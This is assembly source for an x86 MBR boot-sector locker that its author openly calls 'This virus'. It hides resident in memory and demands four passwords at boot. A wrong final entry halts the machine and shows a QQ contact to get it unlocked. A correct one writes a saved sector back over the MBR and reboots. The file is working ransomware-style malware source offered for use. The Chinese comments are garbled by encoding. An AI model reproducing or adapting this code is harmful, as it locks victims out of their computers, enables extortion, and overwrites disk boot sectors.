;=================================================================
;by yeluoQQ393925220 Ҷ��������
CPU 486
BITS 16
        xor ebx,ebx
        mov ds,bx
      mov ax,[0x413]           ;40:13,BIOS���������泣����ڴ��С,��λ:KBs.
      and al,0xfc        ;Ҫ�����������ڴ��ַ,��ҳ��Ϊ����ַ
        sub ax,4
        mov [0x413],ax           ;����һ���ڴ棬ʵ�ֳ����פ��
        shl ax,0x6               ;bx *= 1024 / 16 (KBs->���Ե�ַ=KBs*1024,��:����16)
        mov es,ax                ;�洢�ε�ַ

        mov si,0x7c00            ;�������뵽פ���ڴ���ִ��
        xor di,di                ;ƫ�Ƶ�ַΪ0
      mov cx,0x100             ;����512
        rep movsw

      mov ax,0x201
        mov cl,0x2
        cdq                       ;Convert Double to Quad (386+)��edx��չΪeax�ĸ�λ��Ҳ����˵��Ϊ64λ��

        push es
      push word password         
        retf                     
;=====================================================================     
password:  
    ;��һ������   
        MOV SI,ShowAuthorMessage
     CALL SHOWMESSAGE
     mov si,ShowEnterFMessage 
     CALL SHOWMESSAGE
     CALL GETKEY
     cmp cx,PassWordLength
	 jne password
     je again
again:                       ;�ڶ�������
     mov si,ShowEnterSMessage
     CALL SHOWMESSAGE
     CALL GETKEY
     cmp cx,Passwordsecond
	 jne password
     je lasttime
lasttime:                     ;������
     mov si,ShowEnterTMessage
     call SHOWMESSAGE
     CALL GETKEY
     cmp cx,PassWordthird
	 jne password
     je nextlasttime 
nextlasttime:                     ;���Ĳ�
     mov si,ShowEnterLast 
     call SHOWMESSAGE
     CALL GETKEY
     cmp cx,PassWordlast 
     je bootloader
wrong:                       ;���Ĳ���˵Ļ�
     mov si,ShowByeBye
	   CALL SHOWMESSAGE
     jmp $
bootloader:                      ;У������ɹ�����ʼ��½
 CALL SHOWMESSAGE
 mov si,ShowWelcome 
   xor ax,ax ;��ʼ��
	mov ax,0x7e00
	mov es,ax
	xor bx,bx
	mov ah,0x2
	mov dl,0x80
	mov al,1  ;����
	mov dh,0  ;��ͷ
	mov ch,0  ;����  ��CHSѰַ��ʽ
	mov cl,3  ;����  ��
	int 0x13
	;д��ȥ
	xor bx,bx
	mov dl,0x80
	mov ah,0x3
	mov al,1  ;����
	mov dh,0  ;��ͷ
	mov ch,0  ;����
	mov cl,1  ;MBR����
	int 0x13
	jmp reset;���������
;======================================================================
SHOWMESSAGE:    
      mov ah,0Eh             ; ���� 0Eh: ���             
	 mov bx, 000ch                      
     cs lodsb                                                  ; ���ص�һ���ַ�
Next_Char:
     int 10h
     cs lodsb                                        ; al = �¸��ַ�
     or al,al                                        ; �Ƿ�Ϊ���һ��
     jnz Next_Char                                   ; ������򲻴�ӡ��һ���ַ�
RETURNBACK:
     ret
;===========================================================
GETKEY:
     XOR CX,CX
LOOP:
     MOV AH,0
     INT 16H
     mov bl,al
     AND BX,0xFF
     CMP AL,0DH                                  ;�ж��Ƿ�Enter��
     JZ RETURNBACK
     ADD CX,bx                                   ;����CX��
     MOV AL,24H
     MOV BX,07H                        
     MOV AH,0EH
     INT 10H                                      ;��ʾ$�ţ������ȴ�����
     JMP LOOP
;======================================================
GETENTER:                                           ;�ж��Ƿ�Enter����������򷵻أ������Ǽ����ȴ�����
     MOV AH,0
     INT 16H
     AND AX,0xFF
     CMP AL,0DH
     JNZ GETENTER
     RET
;=======================================================
reset: 
mov ax, 0ffffh           ; ����������������ó�����ת�� FFFF:0 ��Ԫ��ִ��
       push ax             
       mov ax, 0
       push ax
       retf
;======================================================================
ShowAuthorMessage db   10, 13, "This virus by yeluoQQ393925220", 0
ShowEnterFMessage db   10, 13, "Enter first PassWord QAQ", 0
ShowEnterSMessage db   10, 13, "Enter second password awa", 0
ShowEnterTMessage db   10, 13, "Enter the third password qwq ", 0
ShowEnterLast     db   10, 13, "Enter the last password @_@ ", 0
PassWordLength    EQU 0XCEF ;��Ҷ�䵱������Ƴ��ñ���.
Passwordsecond    EQU 0X1682 ;����������ľ������֯�����Ż�������Ω��Ů̾Ϣ��
PassWordthird     EQU 0XAC4 ; yeluo520yeluo4588fanchenyeluo
PassWordlast      EQU 0X41 ;  
ShowByeBye        db   10, 13, "jiesuo+QQ393925220 steal my lock sima", 0
ShowWelcome     db   10, 13, "The password is correct!��Thanks��", 0
;=================================================================
times 510-($-$$) db 0X0                    ;���00h
Boot_Signature            dw 0AA55h